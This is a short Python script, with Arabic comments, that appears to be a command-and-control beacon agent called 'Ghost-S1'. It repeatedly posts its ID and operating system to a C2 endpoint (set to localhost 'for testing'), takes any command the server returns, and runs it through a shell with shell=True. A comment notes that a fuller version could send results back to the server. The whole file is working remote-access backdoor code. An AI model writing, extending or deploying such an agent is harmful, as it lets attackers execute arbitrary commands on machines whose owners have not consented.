import requests
import time
import platform
import subprocess
import os

AGENT_ID = "Ghost-S1"
C2_URL = "http://localhost:5000/api/beacon" # تم التغيير إلى localhost للتجربة

def execute_command(command):
    try:
        # تشغيل الأمر والحصول على النتيجة
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
    except Exception as e:
        return f"Error: {str(e)}"

def start_agent():
    print(f"[*] Agent {AGENT_ID} Started...")
    while True:
        try:
            data = {"id": AGENT_ID, "os": platform.system()}
            response = requests.post(C2_URL, json=data)
            if response.status_code == 200:
                cmd = response.json().get('command')
                if cmd:
                    print(f"[*] Received command: {cmd}")
                    # في النسخة المتقدمة، يمكننا إرسال النتيجة للسيرفر
                    output = execute_command(cmd)
                    print(f"[+] Output:\n{output}")
            time.sleep(5) # تقليل وقت الانتظار للتجربة
        except Exception as e:
            print(f"[!] Beacon failed: {str(e)}")
            time.sleep(10)

if __name__ == "__main__":
    start_agent()
